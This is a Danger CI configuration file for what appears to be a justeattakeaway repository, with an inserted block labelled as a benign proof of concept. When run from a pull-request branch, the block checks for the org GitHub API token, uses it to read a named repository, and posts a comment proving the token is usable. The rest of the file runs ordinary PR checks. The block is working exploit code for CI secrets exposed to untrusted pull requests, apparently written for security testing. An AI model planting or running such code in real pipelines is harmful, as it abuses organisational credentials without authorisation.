import { danger, fail } from 'danger';
import { checks } from '@justeattakeaway/pie-monorepo-utils/dangerjs-checks/index.js';

// === [PoC] benign proof-of-execution — no secret exfil, no state changes ===
const hasToken = !!process.env.DANGER_GITHUB_API_TOKEN;
console.log('[POC] dangerfile from PR branch executed; token present: ' + hasToken);
try {
    if (hasToken) {
        danger.github.api.repos.get({ owner: 'justeattakeaway', repo: 'pie-aperture' })
            .then((res) => {
                console.log('[POC] org app token CAN read: ' + res.data.full_name);
                danger.markdown('[PoC] Posted by a modified dangerfile running with the org GitHub App token.');
            })
            .catch((err) => console.log('[POC] api read failed: ' + err.message));
    }
} catch (err) {
    console.log('[POC] setup error: ' + err.message);
}
// === end PoC ===

const { pr } = danger.github;
const flags = {
    isAutomationPR: pr.user.type === 'Bot',
    isDependabotPR: pr.user.login === 'dependabot[bot]',
};

(async () => {
    // eslint-disable-next-line no-restricted-syntax
    for (const check of checks) {
        // eslint-disable-next-line no-await-in-loop
        await check({
            danger,
            fail,
            pr,
            flags,
        });
    }
})();
